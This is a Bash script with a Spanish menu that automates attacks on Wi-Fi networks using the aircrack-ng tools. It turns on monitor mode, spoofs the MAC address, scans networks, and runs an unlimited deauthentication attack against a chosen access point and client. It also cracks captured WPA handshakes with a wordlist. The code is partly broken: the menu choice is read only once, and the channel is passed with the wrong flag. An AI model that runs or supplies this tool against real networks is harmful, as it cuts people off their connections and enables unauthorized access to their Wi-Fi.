#!/bin/bash

clear
figlet "FrankoSav"
echo "Elegí una opción:"
echo "1. Iniciar Modo monitor y cambiar MAC"
echo "2. Detener Modo monitor"
echo "3. Escanear Redes"
echo "4. Atack Deauth"
echo "5. Crackear Handshake"
echo "6. Salir"
read -p "Opcion: " opcion

while true; do
  case $opcion in
    1)
      # Mon mode on and changed mac
      sudo ifconfig wlan0 down
      sudo airmon-ng start wlan0
      sudo airmon-ng check kill
      sudo macchanger -br wlan0
      sudo ifconfig wlan0 up

      read -p "Enter para volver al menú"
      ;;
    2)
      # Mon mode off
      sudo ifconfig wlan0 down
      sudo airmon-ng stop wlan0
      sudo ifconfig wlan0 up

      read -p "Enter para volver al menú"
      ;;
    3)
      # Scan with interface
      sudo airodump-ng wlan0

      read -p "Enter para volver al menú"
      ;;
    4)
      # Deauth attack
      read -p "Ingrese el número de canal a utilizar: " channel
      read -p "MAC del ACCES POINT objetivo: " mac_ap
      read -p "MAC del cliente objetivo: " mac_cliente
      aireplay-ng --deauth 0 -c $channel -a $mac_ap -c $mac_cliente wlan0

      read -p "Enter para volver al menú"
      ;;
     5)
            # Enter handshake file
            read -p "Ingresa la ruta del archivo handshake: " handshake_file
            
            # Enter wordlist for bruteforce
            read -p "Ingresa la ruta del diccionario a usar: " wordlist_file
            
            # Cracking Handshake
            aircrack-ng $handshake_file -w $wordlist_file
            
            read -p "Enter para volver al menú"
      ;;
    6)
      # Exit
      break
      ;;
    *)
      echo "Opción inválida, por favor seleccione una opción válida"
      ;;
  esac
done
